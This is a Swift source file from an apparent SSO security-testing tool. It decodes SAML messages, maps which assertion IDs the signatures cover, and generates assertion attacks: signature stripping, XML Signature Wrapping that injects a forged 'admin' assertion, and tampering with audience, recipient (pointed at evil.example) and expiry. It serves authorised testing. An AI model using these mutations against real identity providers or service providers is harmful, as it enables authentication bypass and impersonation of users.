// GulpScanner — the SSO Workbench's SAML analysis core (F25 SSO-002/005). SAML's dangerous bugs are
// signature-scope confusions: what is signed vs what the SP trusts. This file decodes a SAML message
// (base64, plus raw-DEFLATE for the redirect binding), computes the signed-node set (the `ds:Reference`
// URIs vs the element IDs actually present) so a UI can highlight signature scope, and generates the
// classic assertion attacks (signature stripping, XML Signature Wrapping, and field tampering). The
// mutations are *constructed* here and never auto-sent — replays are scope-gated at the call site.

import Foundation
import GulpCodec

/// How a SAML message was transported (decode differs): HTTP-POST binding is raw base64; HTTP-Redirect
/// binding is base64 of raw-DEFLATE-compressed XML.
public enum SAMLBinding: String, Sendable {
    case post
    case redirect
}

/// A decoded SAML message's structure (F25 SSO-002).
public struct SAMLMessage: Sendable, Equatable {
    public enum Kind: String, Sendable {
        case authnRequest = "AuthnRequest"
        case response = "Response"
        case logoutRequest = "LogoutRequest"
        case unknown
    }
    public let kind: Kind
    public let xml: String
    /// Every element `ID`/`AssertionID`/`ResponseID` present in the document.
    public let elementIDs: [String]
    /// The IDs a `ds:Signature`/`ds:Reference URI="#..."` actually covers (the signed-node set).
    public let signedIDs: [String]
    /// Assertion IDs that no signature reference covers (the heart of signature-scope bugs).
    public var unsignedAssertionIDs: [String] {
        assertionIDs.filter { !signedIDs.contains($0) }
    }
    public let assertionIDs: [String]

    public init(kind: Kind, xml: String, elementIDs: [String], signedIDs: [String], assertionIDs: [String]) {
        self.kind = kind
        self.xml = xml
        self.elementIDs = elementIDs
        self.signedIDs = signedIDs
        self.assertionIDs = assertionIDs
    }
}

/// A SAML assertion attack (F25 SSO-005): a mutated message and the attack class it tests.
public struct SAMLMutation: Sendable, Equatable {
    public enum Kind: String, Sendable, CaseIterable {
        case signatureStripped = "signature-stripped"
        case signatureWrapping = "xml-signature-wrapping"
        case audienceTampered = "audience-tampered"
        case recipientTampered = "recipient-tampered"
        case notOnOrAfterExtended = "notonorafter-extended"
    }
    public let kind: Kind
    public let xml: String
    public let note: String
    public init(kind: Kind, xml: String, note: String) {
        self.kind = kind
        self.xml = xml
        self.note = note
    }
}

/// The SAML analysis core (F25 SSO-002/005). String-based so it is deterministic and dependency-light;
/// the SP's acceptance of a mutation is what proves a bug, decided by the live DoD, not by parsing here.
public enum SAMLWorkbench {
    // MARK: SSO-002 — decode and structure

    /// Decode a transport-encoded SAML blob to its XML (SSO-002). Returns nil if base64 (or the inflate
    /// for the redirect binding) fails — e.g. an encrypted assertion the caller has no key for.
    public static func decode(_ encoded: String, binding: SAMLBinding) -> String? {
        let cleaned = encoded.trimmingCharacters(in: .whitespacesAndNewlines)
        guard let data = Data(base64Encoded: cleaned) else { return nil }
        switch binding {
        case .post:
            return String(data: data, encoding: .utf8)
        case .redirect:
            guard let inflated = try? Compression.decompress([UInt8](data), .raw) else { return nil }
            return String(decoding: inflated, as: UTF8.self)
        }
    }

    /// Parse a SAML XML document into its structure and signed-node set (SSO-002).
    public static func parse(_ xml: String) -> SAMLMessage {
        let kind: SAMLMessage.Kind
        if xml.contains(":AuthnRequest") || xml.contains("<AuthnRequest") {
            kind = .authnRequest
        } else if xml.contains(":Response") || xml.contains("<Response") {
            kind = .response
        } else if xml.contains(":LogoutRequest") || xml.contains("<LogoutRequest") {
            kind = .logoutRequest
        } else {
            kind = .unknown
        }
        let elementIDs = attributeValues(xml, attribute: "ID")
        let assertionIDs = elementIDsOfTag(xml, tagSuffix: "Assertion")
        // A signature covers the IDs named by its `ds:Reference URI="#id"` (empty URI = enveloped whole
        // doc). We only trust references that sit inside a <...Signature>…</...Signature> block.
        let signedIDs = signatureReferenceIDs(xml)
        return SAMLMessage(
            kind: kind, xml: xml, elementIDs: elementIDs, signedIDs: signedIDs, assertionIDs: assertionIDs)
    }

    // MARK: SSO-005 — assertion attacks (constructed, never auto-sent)

    /// Build the standard assertion attacks for a signed SAML Response (SSO-005). The SP's accept/reject
    /// of each is the finding; this only constructs the mutated XML.
    public static func mutations(_ xml: String) -> [SAMLMutation] {
        var out: [SAMLMutation] = []

        // 1. Signature stripping: remove every <...Signature>…</...Signature> block. A correct SP rejects
        // the now-unsigned assertion; a vulnerable one accepts it.
        let stripped = removeElements(xml, tagSuffix: "Signature")
        if stripped != xml {
            out.append(
                .init(
                    kind: .signatureStripped, xml: stripped,
                    note: "All ds:Signature elements removed — the assertion is unsigned."))
        }

        // 2. XML Signature Wrapping: wrap a forged (unsigned) assertion alongside the original so a
        // signature-by-reference check passes while the SP processes the attacker's assertion. We clone
        // the first assertion with a new ID and a swapped NameID, and inject it before the original.
        if let assertion = firstElement(xml, tagSuffix: "Assertion") {
            let forged =
                assertion
                .replacingFirst(ofLiteral: "ID=\"", with: "ID=\"_xsw_")
                .replacingFirst(of: #"(<[^>]*:?NameID[^>]*>)[^<]*(</[^>]*:?NameID>)"#, with: "$1admin$2")
            let wrapped = xml.replacingFirst(ofLiteral: assertion, with: forged + assertion)
            if wrapped != xml {
                out.append(
                    .init(
                        kind: .signatureWrapping, xml: wrapped,
                        note: "Forged unsigned assertion (NameID=admin) wrapped before the signed one (XSW).")
                )
            }
        }

        // 3. Field tampering: audience, recipient, and NotOnOrAfter. A properly-validating SP rejects
        // each; the mutated value is the evidence.
        if let m = replaceAttribute(xml, tag: "Audience", wrap: true, with: "https://evil.example/sp") {
            out.append(.init(kind: .audienceTampered, xml: m, note: "Audience changed to an attacker SP."))
        }
        if let m = replaceAttribute(xml, attribute: "Recipient", with: "https://evil.example/acs") {
            out.append(
                .init(kind: .recipientTampered, xml: m, note: "SubjectConfirmation Recipient redirected."))
        }
        if let m = replaceAttribute(xml, attribute: "NotOnOrAfter", with: "2099-01-01T00:00:00Z") {
            out.append(
                .init(
                    kind: .notOnOrAfterExtended, xml: m, note: "Assertion validity window extended to 2099."))
        }
        return out
    }

    // MARK: String/XML helpers (deterministic, no DOM)

    /// Values of `attribute="..."` across the document.
    static func attributeValues(_ xml: String, attribute: String) -> [String] {
        matches(xml, pattern: "\\b\(attribute)=\"([^\"]*)\"").map { $0 }
    }

    /// IDs of elements whose tag ends with `tagSuffix` (e.g. `saml:Assertion` for suffix `Assertion`).
    static func elementIDsOfTag(_ xml: String, tagSuffix: String) -> [String] {
        matches(xml, pattern: "<[^>]*:?\(tagSuffix)\\b[^>]*\\bID=\"([^\"]*)\"")
    }

    /// The `#id` reference URIs that appear inside a Signature block (the signed-node set).
    static func signatureReferenceIDs(_ xml: String) -> [String] {
        let sigBlocks = elementBodies(xml, tagSuffix: "Signature")
        var ids: [String] = []
        for block in sigBlocks {
            for ref in matches(block, pattern: "<[^>]*:?Reference\\b[^>]*\\bURI=\"#([^\"]*)\"") {
                ids.append(ref)
            }
        }
        return ids
    }

    /// First match group for each occurrence of `pattern`.
    private static func matches(_ text: String, pattern: String) -> [String] {
        guard let rx = try? NSRegularExpression(pattern: pattern, options: [.dotMatchesLineSeparators]) else {
            return []
        }
        let range = NSRange(text.startIndex..., in: text)
        return rx.matches(in: text, range: range).compactMap { m in
            guard m.numberOfRanges > 1, let r = Range(m.range(at: 1), in: text) else { return nil }
            return String(text[r])
        }
    }

    /// Remove every `<...Suffix ...>...</...Suffix>` (and self-closing) element.
    static func removeElements(_ xml: String, tagSuffix: String) -> String {
        var out = xml
        let pattern = "<([a-zA-Z0-9]+:)?\(tagSuffix)\\b[^>]*>.*?</([a-zA-Z0-9]+:)?\(tagSuffix)>"
        if let rx = try? NSRegularExpression(pattern: pattern, options: [.dotMatchesLineSeparators]) {
            out = rx.stringByReplacingMatches(
                in: out, range: NSRange(out.startIndex..., in: out), withTemplate: "")
        }
        return out
    }

    /// The full text of the first `<...Suffix ...>...</...Suffix>` element.
    static func firstElement(_ xml: String, tagSuffix: String) -> String? {
        let pattern = "<([a-zA-Z0-9]+:)?\(tagSuffix)\\b[^>]*>.*?</([a-zA-Z0-9]+:)?\(tagSuffix)>"
        guard let rx = try? NSRegularExpression(pattern: pattern, options: [.dotMatchesLineSeparators]),
            let m = rx.firstMatch(in: xml, range: NSRange(xml.startIndex..., in: xml)),
            let r = Range(m.range, in: xml)
        else { return nil }
        return String(xml[r])
    }

    /// The inner body of every `<...Suffix>...</...Suffix>` element.
    static func elementBodies(_ xml: String, tagSuffix: String) -> [String] {
        let pattern = "<([a-zA-Z0-9]+:)?\(tagSuffix)\\b[^>]*>(.*?)</([a-zA-Z0-9]+:)?\(tagSuffix)>"
        guard let rx = try? NSRegularExpression(pattern: pattern, options: [.dotMatchesLineSeparators]) else {
            return []
        }
        return rx.matches(in: xml, range: NSRange(xml.startIndex..., in: xml)).compactMap { m in
            guard m.numberOfRanges > 2, let r = Range(m.range(at: 2), in: xml) else { return nil }
            return String(xml[r])
        }
    }

    /// Replace an `attribute="..."` value (first occurrence). Returns nil if the attribute is absent.
    static func replaceAttribute(_ xml: String, attribute: String, with newValue: String) -> String? {
        guard let rx = try? NSRegularExpression(pattern: "(\\b\(attribute)=\")[^\"]*(\")") else { return nil }
        let range = NSRange(xml.startIndex..., in: xml)
        guard rx.firstMatch(in: xml, range: range) != nil else { return nil }
        return rx.stringByReplacingMatches(in: xml, range: range, withTemplate: "$1\(newValue)$2")
    }

    /// Replace the text content of the first `<...Tag>…</...Tag>` element (for Audience etc.).
    static func replaceAttribute(_ xml: String, tag: String, wrap: Bool, with newValue: String) -> String? {
        guard
            let rx = try? NSRegularExpression(
                pattern: "(<[^>]*:?\(tag)>)[^<]*(</[^>]*:?\(tag)>)",
                options: [.dotMatchesLineSeparators])
        else { return nil }
        let range = NSRange(xml.startIndex..., in: xml)
        guard rx.firstMatch(in: xml, range: range) != nil else { return nil }
        return rx.stringByReplacingMatches(in: xml, range: range, withTemplate: "$1\(newValue)$2")
    }
}

extension String {
    /// Replace the first regex match with a template.
    fileprivate func replacingFirst(of pattern: String, with template: String) -> String {
        guard let rx = try? NSRegularExpression(pattern: pattern, options: [.dotMatchesLineSeparators]) else {
            return self
        }
        guard let m = rx.firstMatch(in: self, range: NSRange(startIndex..., in: self)) else { return self }
        let ns = NSMutableString(string: self)
        rx.replaceMatches(in: ns, range: m.range, withTemplate: template)
        return String(ns)
    }

    /// Replace the first literal occurrence of `target`.
    fileprivate func replacingFirst(ofLiteral target: String, with replacement: String) -> String {
        guard let r = range(of: target) else { return self }
        return replacingCharacters(in: r, with: replacement)
    }
}
